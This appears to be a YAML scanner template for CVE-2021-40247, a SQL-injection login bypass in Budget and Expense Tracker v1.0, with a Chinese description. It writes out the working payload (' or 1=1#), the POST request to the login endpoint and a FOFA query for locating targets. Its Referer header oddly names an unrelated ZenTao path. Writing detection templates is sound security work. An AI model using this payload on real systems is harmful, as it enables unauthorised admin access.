expression: r0()
id: CVE-2021-40247
info:
  author: oretnom23
  description: "B&E Tracker v1.0 \u5B58\u5728\u6F0F\u6D1E\u5728\u4ECE/expense_budget/dist/js/script.js\
    \ \u5E94\u7528\u7A0B\u5E8F\u8C03\u7528\u7684\u5E94\u7528\u7A0B\u5E8F /expense_budget/classes/Login.php\
    \ \u4E2D\u3002 \n\u767B\u5F55\u8868\u5355\u4E2D\u7684\u53C2\u6570\uFF08\u7528\u6237\
    \u540D\uFF09\u6CA1\u6709\u5F97\u5230\u6B63\u786E\u4FDD\u62A4\uFF0C\u6CA1\u6709\
    \u5B89\u5168\u6027\uFF0C\u4E5F\u65E0\u6CD5\u9003\u907F\u6076\u610F\u8D1F\u8F7D\
    \u3002 \u5F53\u7528\u6237\u5411 MySQL \u670D\u52A1\u5668\u53D1\u9001\u8BF7\u6C42\
    \u65F6\uFF0C\u4ED6\u53EF\u4EE5\u7ED5\u8FC7\u767B\u5F55\u51ED\u636E\u5E76\u63A7\
    \u5236\u7BA1\u7406\u5E10\u6237\u3002\nfofa-query: \"B&E Tracker\"\n"
  name: "Budget and Expense Tracker System  SQL\u6CE8\u5165 - \u7ED5\u8FC7B&E Tracker\u767B\
    \u5F55CVE-2021-40247"
  reference:
  - https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/B%26E%20Tracker-by:oretnom23-v1.0
  severity: critical
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'{"status":"success"}')
      && response.headers["content-type"].contains("text/html")
    request:
      body: 'username=nu11secu1rty+''+or+1%3D1%23&password=

        '
      headers:
        Origin: '{{hosturl}}'
        Referer: '{{hosturl}}/zentao/admin/login.php'
        Sec-Fetch-Dest: empty
        Sec-Fetch-Mode: cors
        Sec-Fetch-Site: same-origin
        Te: trailers
      method: POST
      path: /classes/Login.php?f=login
set:
  hosturl: request.url
